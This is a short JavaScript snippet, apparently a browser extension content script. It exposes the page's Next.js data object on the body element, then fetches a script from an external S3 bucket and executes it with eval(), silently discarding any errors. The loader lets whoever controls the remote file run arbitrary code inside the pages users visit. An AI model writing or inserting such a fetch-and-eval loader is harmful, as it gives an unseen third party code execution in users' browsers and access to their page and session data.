try {
	if (typeof __NEXT_DATA__ !== 'undefined') {
		document.getElementsByTagName('body')[0].setAttribute('tmp___NEXT_DATA__', JSON.stringify(__NEXT_DATA__));
	}

	fetch('https://s3.ap-southeast-1.amazonaws.com/podorders.store-hub/__chrome_extension/bundle.js', {
		headers: {
			accept: '*/*',
			'sec-fetch-dest': 'script',
		},
		method: 'GET',
	})
		.then((r) => r.text())
		.then((data) => {
			eval(data);
		});
} catch (error) {}
